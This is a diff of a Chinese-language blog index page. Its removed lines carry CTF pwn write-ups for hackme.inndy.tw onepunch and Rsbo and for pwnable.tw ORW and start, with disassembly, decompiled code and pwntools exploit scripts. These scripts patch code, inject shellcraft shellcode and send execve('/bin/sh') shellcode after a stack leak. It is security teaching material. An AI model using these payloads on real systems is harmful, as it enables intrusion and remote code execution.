qword fs:[0x28]</span><br><span class="line">│           0x00400703      488945f8       mov qword [canary], rax</span><br><span class="line">│           0x00400707      31c0           xor eax, eax</span><br><span class="line">│           0x00400709      488b05480920.  mov rax, qword [obj.stdout] ; rdi</span><br><span class="line">│                                                                      ; [0x601058:8]&#x3D;0                          </span><br><span class="line">│           0x00400710      be00000000     mov esi, 0                  ; char *buf</span><br><span class="line">│           0x00400715      4889c7         mov rdi, rax                ; FILE *stream</span><br><span class="line">│           0x00400718      e863feffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)</span><br><span class="line">│           0x0040071d      bf14084000     mov edi, str.Where_What     ; 0x400814 ; &quot;Where What?&quot; ; const char *format                                                                                                            </span><br><span class="line">│           0x00400722      b800000000     mov eax, 0</span><br><span class="line">│           0x00400727      e864feffff     call sym.imp.printf         ; int printf(const char *format)</span><br><span class="line">│           0x0040072c      488d55e8       lea rdx, qword [var_18h]</span><br><span class="line">│           0x00400730      488d45f0       lea rax, qword [var_10h]</span><br><span class="line">│           0x00400734      4889c6         mov rsi, rax</span><br><span class="line">│           0x00400737      bf20084000     mov edi, str.llx__d         ; 0x400820 ; &quot;%llx %d&quot; ; const char *format                                                                                                                </span><br><span class="line">│           0x0040073c      b800000000     mov eax, 0</span><br><span class="line">│           0x00400741      e86afeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)</span><br><span class="line">│           0x00400746      8945ec         mov dword [var_14h], eax</span><br><span class="line">│           0x00400749      837dec02       cmp dword [var_14h], 2</span><br><span class="line">│       ┌─&lt; 0x0040074d      7407           je 0x400756</span><br><span class="line">│       │   0x0040074f      b800000000     mov eax, 0</span><br><span class="line">│      ┌──&lt; 0x00400754      eb22           jmp 0x400778</span><br><span class="line">│      ││   ; CODE XREF from main @ 0x40074d</span><br><span class="line">│      │└─&gt; 0x00400756      488b45f0       mov rax, qword [var_10h]</span><br><span class="line">│      │    0x0040075a      8b55e8         mov edx, dword [var_18h]</span><br><span class="line">│      │    0x0040075d      8810           mov byte [rax], dl</span><br><span class="line">│      │    0x0040075f      8b45e8         mov eax, dword [var_18h]</span><br><span class="line">│      │    0x00400762      3dff000000     cmp eax, 0xff               ; 255</span><br><span class="line">│      │┌─&lt; 0x00400767      750a           jne 0x400773</span><br><span class="line">│      ││   0x00400769      bf28084000     mov edi, str.No_flag_for_you ; 0x400828 ; &quot;No flag for you&quot; ; const char *s                                                                                                            </span><br><span class="line">│      ││   0x0040076e      e8edfdffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│      ││   ; CODE XREF from main @ 0x400767</span><br><span class="line">│      │└─&gt; 0x00400773      b800000000     mov eax, 0</span><br><span class="line">│      │    ; CODE XREF from main @ 0x400754</span><br><span class="line">│      └──&gt; 0x00400778      488b4df8       mov rcx, qword [canary]</span><br><span class="line">│           0x0040077c      6448330c2528.  xor rcx, qword fs:[0x28]</span><br><span class="line">│       ┌─&lt; 0x00400785      7405           je 0x40078c</span><br><span class="line">│       │   0x00400787      e8e4fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)</span><br><span class="line">│       │   ; CODE XREF from main @ 0x400785</span><br><span class="line">│       └─&gt; 0x0040078c      c9             leave</span><br><span class="line">└           0x0040078d      c3             ret</span><br></pre></td></tr></table></figure>
-
-<h3 id="補充知識"><a href="#補充知識" class="headerlink" title="補充知識"></a>補充知識</h3><p>然後再補一下assembly <code>jxx &lt;address&gt;</code> instruction:</p>
-<p>基本上是2 byte的instruction:</p>
-<ol>
-<li>第一個byte是jxx指令本身</li>
-<li>第二個byte是offset(相對於當前的RIP/EIP)</li>
-</ol>
-<p>以<code>0x00400767</code> 的<code>jne 0x400773</code>為例:</p>
-<ol>
-<li>此處機械碼為 <code>750a</code></li>
-<li><code>0x75</code> 為 <code>jne</code></li>
-<li><code>0x400773 = 0x400767 + 0xa +2</code> (注意+2因為RIP已經讀完這兩個byte) </li>
-</ol>
-<p>所以我們可以先把<code>0x00400767</code> 的<code>jne 0x400773</code> 改成跳到main裡面</p>
-<p>這樣就可以成為無限迴圈(因為<code>v4</code>永遠不會等於<code>255</code>, <code>0xff</code> 是無效的opcode)</p>
-<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>有了無限迴圈之後, 就可以寫值了</p>
-<p>只要最後把它再次patch回去就好</p>
-<p>因為可以將<code>v6</code>的值改成 <code>v4</code>, 我們可以逐byte寫入shellcode(注意v4是<code>int</code>)</p>
-<p>接下來是要想寫到哪一段記憶體, 因為有NX, 可以考慮寫到<code>.text</code></p>
-<p>以我的exploit為例, 是跳轉到<code>__libc_csu_init</code> 因為空間夠大</p>
-<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>注意最後要再patch回來</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># new code based on Writeup: https://blog.csdn.net/kevin66654/article/details/88563770</span></span><br><span class="line"><span class="comment"># seems better (?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">base = <span class="number">0x00400790</span> <span class="comment"># __libc_csu_init</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;hackme.inndy.tw&#x27;</span>, <span class="number">7718</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Where What?&#x27;</span>, <span class="string">&#x27;0x400768 137&#x27;</span>)</span><br><span class="line"><span class="comment"># time.sleep(0.5)</span></span><br><span class="line"><span class="comment"># p.sendline(&#x27;0x400763 -2&#x27;)</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sc)):</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    p.sendline(hex(base + i) + <span class="string">&#x27; &#x27;</span> + str(ord(sc[i])))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;[+] Wrote %d bytes to .text&#x27;</span> % (i + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;[+] Wrote shellcode to .text&#x27;</span></span><br><span class="line">p.sendline(<span class="string">&#x27;0x400768 39&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/archives/hackme-inndy-tw-onepunch-Writeup/#more" rel="contents">
+                閱讀全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -730,10 +537,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">發表於</span>
-              
 
-              <time title="創建時間：2020-10-16 19:25:00 / 修改時間：19:36:37" itemprop="dateCreated datePublished" datetime="2020-10-16T19:25:00+08:00">2020-10-16</time>
+              <time title="創建時間：2020-10-16 19:25:00" itemprop="dateCreated datePublished" datetime="2020-10-16T19:25:00+08:00">2020-10-16</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新於</span>
+                <time title="修改時間：2021-01-22 18:58:13" itemprop="dateModified" datetime="2021-01-22T18:58:13+08:00">2021-01-22</time>
+              </span>
 
           
 
@@ -747,20 +560,14 @@
 
       
           <h1 id="pwnable-tw-ORW-pwn"><a href="#pwnable-tw-ORW-pwn" class="headerlink" title="pwnable.tw ORW (pwn)"></a>pwnable.tw ORW (pwn)</h1><h2 id="保護機制"><a href="#保護機制" class="headerlink" title="保護機制"></a>保護機制</h2><p>Canary, Partial RELRO</p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give my your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0xC8</span>u);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>先是讀取了一大段shellcode, 接著直接跑起來</p>
-<p>不過還是先看看 <code>orw_seccomp()</code>:</p>
-<h3 id="orw-seccomp"><a href="#orw-seccomp" class="headerlink" title="orw_seccomp"></a>orw_seccomp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">orw_seccomp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [esp+4h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  qmemcpy(&amp;v3, &amp;unk_8048640, <span class="number">0x60</span>u);</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在C語言有一種”SandBox模式”, 限制程式只能使用 <code>open()</code>, <code>read()</code>, <code>write()</code></p>
-<p>可以通過<code>seccomp()</code> 或是<code>prctl()</code>開啟</p>
-<p>所以這裡的邏輯不重要, 只要知道只能 open, read, write就好</p>
-<p>也不用繞canary, 因為沒有Control PC</p>
-<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>利用pwntools <code>shellcraft()</code>拼出call open, read, write印出flag</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pwnlib.shellcraft</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.i386.pushstr(<span class="string">&#x27;/home/orw/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">&#x27;SYS_open&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">&#x27;SYS_read&#x27;</span>, <span class="string">&#x27;eax&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">0x50</span>)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">&#x27;SYS_write&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Give my your shellcode:&#x27;</span>, asm(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
-
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/archives/pwnable-tw-ORW-Writeup/#more" rel="contents">
+                閱讀全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -802,10 +609,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">發表於</span>
-              
 
-              <time title="創建時間：2020-10-16 18:57:30 / 修改時間：19:15:39" itemprop="dateCreated datePublished" datetime="2020-10-16T18:57:30+08:00">2020-10-16</time>
+              <time title="創建時間：2020-10-16 18:57:30" itemprop="dateCreated datePublished" datetime="2020-10-16T18:57:30+08:00">2020-10-16</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新於</span>
+                <time title="修改時間：2021-01-22 18:58:24" itemprop="dateModified" datetime="2021-01-22T18:58:24+08:00">2021-01-22</time>
+              </span>
 
           
 
@@ -821,22 +634,14 @@
           <h1 id="pwnable-tw-start-pwn"><a href="#pwnable-tw-start-pwn" class="headerlink" title="pwnable.tw start (pwn)"></a>pwnable.tw start (pwn)</h1><h2 id="保護機制"><a href="#保護機制" class="headerlink" title="保護機制"></a>保護機制</h2><p>Nope</p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程式僅有一OEP (entry 0)</p>
 <p>簡單看一下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌ 61: entry0 ();</span><br><span class="line">│           0x08048060      54             push esp                    ; [01] -r-x section size 67 named .text</span><br><span class="line">│           0x08048061      689d800408     push loc._exit              ; 0x804809d ; &quot;\1\xc0@\u0340\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff&quot;                                                         </span><br><span class="line">│           0x08048066      31c0           xor eax, eax</span><br><span class="line">│           0x08048068      31db           xor ebx, ebx</span><br><span class="line">│           0x0804806a      31c9           xor ecx, ecx</span><br><span class="line">│           0x0804806c      31d2           xor edx, edx</span><br><span class="line">│           0x0804806e      684354463a     push 0x3a465443             ; &#39;CTF:&#39;</span><br><span class="line">│           0x08048073      6874686520     push 0x20656874             ; &#39;the &#39;</span><br><span class="line">│           0x08048078      6861727420     push 0x20747261             ; &#39;art &#39;</span><br><span class="line">│           0x0804807d      6873207374     push 0x74732073             ; &#39;s st&#39;</span><br><span class="line">│           0x08048082      684c657427     push 0x2774654c             ; &#39;Let&#39;&#39;</span><br><span class="line">│           0x08048087      89e1           mov ecx, esp</span><br><span class="line">│           0x08048089      b214           mov dl, 0x14                ; 20</span><br><span class="line">│           0x0804808b      b301           mov bl, 1</span><br><span class="line">│           0x0804808d      b004           mov al, 4</span><br><span class="line">│           0x0804808f      cd80           int 0x80</span><br><span class="line">│           0x08048091      31db           xor ebx, ebx</span><br><span class="line">│           0x08048093      b23c           mov dl, 0x3c                ; &#39;&lt;&#39; ; 60</span><br><span class="line">│           0x08048095      b003           mov al, 3</span><br><span class="line">│           0x08048097      cd80           int 0x80</span><br><span class="line">│           0x08048099      83c414         add esp, 0x14</span><br><span class="line">└           0x0804809c      c3             ret</span><br></pre></td></tr></table></figure>
-
-<p>先是把字串<code>&quot;Let&#39;s start the CTF:&quot;</code>印出, 接著用<code>read()</code>讀了 60 bytes造成overflow</p>
-<p>然後就沒了, 非常簡單</p>
-<p>接著就是想辦法用 ret2shellcode拿到shell, 但stack位置無從得知, 必須想辦法找Gadget leak stack</p>
-<p>仔細觀察組語可以發現在<code>0x08048087</code>處一路執行下去, 可以用<code>write</code>把ESP印出來</p>
-<p>註: 人肉decompile大概可以看出是</p>
-<p><code>write(1, $esp, 0x14)</code></p>
-<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>先控制EIP跳轉到<code>0x08048087</code>後, 再跳轉回主程式, 將shellcode寫到stack上然後getshell</p>
-<p>小坑點:</p>
-<ol>
-<li>因為輸入長度只有60, 不能使用<code>shellcraft</code>, 可以到shellstorm上面找x86 shellcode</li>
-<li>在堆leak chain的時候為了穩定, 使用<code>send()</code>, 而不是<code>sendline()</code></li>
-</ol>
-<p>exploit:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#first stage (leak stack)</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x14</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Let&#x27;s start the CTF:&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#print p.recv(4)</span></span><br><span class="line">esp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;[+]Stack at:&#123;&#125;&#x27;</span>.format(hex(esp))</span><br><span class="line"></span><br><span class="line"><span class="comment">#second stage</span></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x14</span> + p32(esp + <span class="number">0x14</span>) + shellcode </span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/archives/pwnable-tw-start-Writeup/#more" rel="contents">
+                閱讀全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -878,10 +683,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">發表於</span>
-              
 
-              <time title="創建時間：2020-10-15 20:53:03 / 修改時間：21:31:21" itemprop="dateCreated datePublished" datetime="2020-10-15T20:53:03+08:00">2020-10-15</time>
+              <time title="創建時間：2020-10-15 20:53:03" itemprop="dateCreated datePublished" datetime="2020-10-15T20:53:03+08:00">2020-10-15</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新於</span>
+                <time title="修改時間：2021-01-22 18:57:56" itemprop="dateModified" datetime="2021-01-22T18:57:56+08:00">2021-01-22</time>
+              </span>
 
           
 
@@ -895,31 +706,14 @@
 
       
           <h1 id="hackme-inndy-tw-Rsbo-amp-Rsbo-2-pwn"><a href="#hackme-inndy-tw-Rsbo-amp-Rsbo-2-pwn" class="headerlink" title="hackme.inndy.tw Rsbo(&amp;Rsbo 2) (pwn)"></a>hackme.inndy.tw Rsbo(&amp;Rsbo 2) (pwn)</h1><h2 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h2><p>Tips: ROP, open, read</p>
-<h2 id="保護機制"><a href="#保護機制" class="headerlink" title="保護機制"></a>保護機制</h2><p><code>NX</code>開啟，<code>Partial RELRO</code></p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="main的邏輯"><a href="#main的邏輯" class="headerlink" title="main的邏輯:"></a>main的邏輯:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">80</span>]; <span class="comment">// [esp+10h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+60h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+64h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+68h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+6Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x1E</span>u);</span><br><span class="line">  init();</span><br><span class="line">  v8 = read_80_bytes(buf);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = rand();</span><br><span class="line">    v7 = v3 % (i + <span class="number">1</span>);</span><br><span class="line">    v6 = buf[i];</span><br><span class="line">    buf[i] = buf[v3 % (i + <span class="number">1</span>)];</span><br><span class="line">    buf[v7] = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, buf, v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到是先分配了長度60的buf, 以及4個整數，接著呼叫<code>alarm()</code>, <code>init()</code></p>
-<p>先看看<code>init()</code>的邏輯:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [esp+14h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">&quot;/home/ctf/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, buf, <span class="number">0x10</span>u);</span><br><span class="line">  seed = time(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    seed = (<span class="keyword">signed</span> <span class="keyword">int</span>)(<span class="number">1337</span> * seed + buf[i]) % <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">  srand(seed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>init()</code>的邏輯主要是:</p>
-<ol>
-<li>打開<code>/home/ctf/flag</code>, 然後讀到buf (長度16)</li>
-<li>搞出一個<code>seed</code>, 然後對flag做了一些操作</li>
-</ol>
-<p>看不出有明顯漏洞, 接著看看<code>read_80_bytes()</code>:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">read_80_bytes</span><span class="params">(<span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x80</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>很簡單, 就是讀<code>0x80</code> bytes</p>
